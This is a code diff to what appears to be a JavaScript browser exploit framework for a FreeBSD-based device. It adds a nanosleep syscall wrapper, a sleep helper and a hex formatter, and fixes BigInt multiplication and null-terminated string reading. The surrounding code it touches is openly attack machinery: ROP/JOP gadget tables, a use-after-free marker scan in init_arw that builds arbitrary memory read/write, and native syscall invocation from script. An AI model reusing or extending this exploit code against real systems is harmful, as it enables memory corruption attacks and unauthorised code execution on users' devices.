@@ -47,6 +47,7 @@ var open = undefined;
 var close = undefined;
 var fstat = undefined;
 var sysctl = undefined;
+var nanosleep = undefined;
 
 // user for ROP/JOP gadgets
 var gadgets = {
@@ -348,9 +349,9 @@ var BigInt = BigInt || class {
     var m11 = Math.imul(this.hi, value.hi);
 
     var d = m01 + m10;
-    var lo = m00 + (d << 0x20);
+    var lo = m00 + (d >>> 0);
     var c = lo > 0xFFFFFFFF ? 1 : 0;
-    var hi = m11 + (d >>> 0x20) + c;
+    var hi = m11 + Math.floor(d / 0x100000000) + c;
     if (hi > 0xFFFFFFFF) {
       throw new Error("mul overflowed !!");
     }
@@ -1051,6 +1052,10 @@ class Struct {
 }
 //#endregion
 //#region Extension
+Number.prototype.hex = function () {
+  return `0x${this.toString(16).toUpperCase()}`;
+};
+
 Number.prototype.align_up = function (alignment) {
   var mask = alignment - 1;
   return (this + mask) & ~mask;
@@ -1161,34 +1166,30 @@ Uint8Array.from = function (addr, sz) {
 String.from = function (addr, sz) {
   sz = typeof sz === "undefined" ? -1 : sz;
 
-  var chunk;
-  var str = "";
-  if (addr.hasOwnProperty("arr")) {
-    chunk = 0x8000;
-    for (var i = 0; i < addr.arr.length; i += chunk) {
-      str += String.fromCodePoint(...addr.arr.subarray(i, i + chunk));
-    }
-  } else {
-    var u8 = Uint8Array.from(addr, sz);
+  var has_arr = addr.hasOwnProperty("arr");
 
+  if (sz === -1) {
+    var u8 = has_arr ? addr.arr : Uint8Array.from(addr, sz);
+    var len = has_arr ? addr.arr.length : 0xFFFFFFFF;
+
+    for (var i = 0; i < len; i++) {
+      if (u8[i] === 0) {
+        sz = i;
+        break;
+      }
+    }
+        
     if (sz === -1) {
-      for (var i = 0; i < 0xFFFFFFFF; i++) {
-        if (u8[i] === 0) {
-          sz = i;
-          break;
-        }
-      }
-    
-      if (sz === -1) {
-        throw new Error("Not a null-terminated string !!");
-      }
+      throw new Error("Not a null-terminated string !!");
     }
+  }
 
-    chunk = Math.min(sz, 0x8000);
-    for (var i = 0; i < sz; i += chunk) {
-      str += String.fromCodePoint(...Uint8Array.from(addr.add(i), chunk));
-      chunk = Math.min(sz - i, 0x8000);
-    }
+  var str = "";
+  var chunk = Math.min(sz, 0x8000);
+  for (var i = 0; i < sz; i += chunk) {
+    var slice = has_arr ? addr.arr.subarray(i, i + chunk) : Uint8Array.from(addr.add(i), chunk);
+    str += String.fromCodePoint(...slice);
+    chunk = Math.min(sz - i, 0x8000);
   }
   
   return str;
@@ -1357,6 +1358,17 @@ function sdk_version() {
   };
 };
 
+function sleep(nsec) {
+  var time = timespec.from(alloc(timespec.sizeof));
+
+  time.tv_sec = Math.floor(nsec / 1e9);
+  time.tv_nsec = nsec % 1e9;
+    
+  if (nanosleep.invoke(time.addr).eq(-1)) {
+    throw new SyscallError(`Unable to sleep for ${nsec} nano seconds !!`);
+  }
+}
+
 function atob(b64) {
   var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
   var length = b64.length * 0.75;
@@ -1427,7 +1439,7 @@ function read_file_str(path, flags, mode) {
   var data_addr = data.get_backing();
   data_addr.arr = data;
   
-  return String.from(data_addr);
+  return String.from(data_addr, data.length);
 };
 
 function init_arw() {
@@ -1470,7 +1482,7 @@ function init_arw() {
       log(`Found marker at uaf_u32[${i}] !!`);
 
       unboxed = i + 2;
-      boxed = [uaf_u32[unboxed] & 0xFFFF, (uaf_u32[unboxed] >> 16) & 0xFFFF];
+      boxed = [uaf_u32[unboxed] & 0xFFFF, (uaf_u32[unboxed] >>> 0x10) & 0xFFFF];
 
       break;
     }
@@ -1480,7 +1492,7 @@ function init_arw() {
     throw new Error("Unable to find marker !!");
   }
 
-  debug(`boxed: ${boxed[0]} - ${boxed[1]}`);
+  debug(`boxed: ${boxed}`);
 
   leak = { obj: 0 };
 
@@ -1674,6 +1686,7 @@ function init_syscall() {
   close = new NativeFunction(0x6, "bigint");
   fstat = new NativeFunction(0xBD, "bigint");
   sysctl = new NativeFunction(0xCA, "bigint");
+  nanosleep = new NativeFunction(0xF0, "bigint");
 
   log("Initiated SYSCALL !!");
 };
